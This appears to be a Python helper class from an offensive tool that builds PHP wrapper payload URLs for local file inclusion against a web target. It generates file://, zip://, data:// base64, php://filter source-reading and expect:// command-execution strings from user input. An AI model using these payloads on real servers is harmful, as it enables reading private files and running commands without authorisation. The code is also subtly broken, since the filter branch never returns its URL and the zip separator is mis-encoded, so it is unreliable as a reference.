
import sys


class wrapper:

    __possible_wrappers={
        "file":"datai",
        "zip":"datai",
        "input":"php://input",
        "data":"datai",
        "filter":"datai",
        "expect":"datai"}

    def __init__(self,url,entry,wrapper):
        self.__url=url
        self.__entry=entry
        self.__wrapper=wrapper
        pass

    def check_wrapper(self):

        keys = self.__possible_wrappers.keys()
        str_cmd = None
        str_cmd = self.search_keys(keys)

        if self.is_not_found(str_cmd) == True:
            print("filter not found")

        return str_cmd

    def search_keys(self,keys):
        str_cmd = None
        for value_key in keys:
            if self.__wrapper == value_key:
                if self.__possible_wrappers[value_key] == "datai":
                    str_cmd = self.elaborate(value_key)
                else:
                    str_cmd = "{}/?{}={}".format(str(self.__url),str(self.__entry),self.__possible_wrappers[self.__wrapper])
        
        return str_cmd

    def elaborate(self,value):

        if value == "zip":
            str_zip = input("insert name of the zip archive: ")
            str_filename = input("insert php filename: ")
            str_cmd = "{}/?{}=zip://{}%32{}".format(str(self.__url),str(self.__entry),str(str_zip),str(str_filename))
            return str_cmd
        
        if value == "file":
            str_filename = input("insert php file name: ")
            str_cmd = "{}/?{}=file://{}".format(str(self.__url),str(self.__entry),str(str_filename))
            return str_cmd

        if value == "data":
            str_base64 = input("insert base64 content")
            str_cmd = "{}/?{}=data://text/plain;base64,{}".format(str(self.__url),str(self.__entry),str(str_base64))
            return str_cmd

        if value == "filter":
            str_resource = input("insert filename to filter: ")
            str_cmd = "{}/?{}=php://filter/convert.base64-encode/resource={}".format(str(self.__url),str(self.__entry),str(str_resource))
            pass

        if value == "expect":
            str_cmd = input("insert command to execute ")
            str_cmd = "{}/?{}=expect://{}".format(str(self.__url),str(self.__entry),str(str_cmd))
            return str_cmd

        return "notfound"
        
    def is_not_found(self,str_cmd)->bool:
         if(str_cmd == "notfound"):
            return True
         return False

    def set_url(self,url):
        self.__url = url

    def get_url(self) -> str:
        return self.__url

    def set_entry(self,entry):
        self.__entry=entry

    def get_entry(self) -> str:
        return self.__entry

    def set_wrapper(self,wrapper):
        self.__wrapper = wrapper

    def get_wrapper(self):
        return self.__wrapper


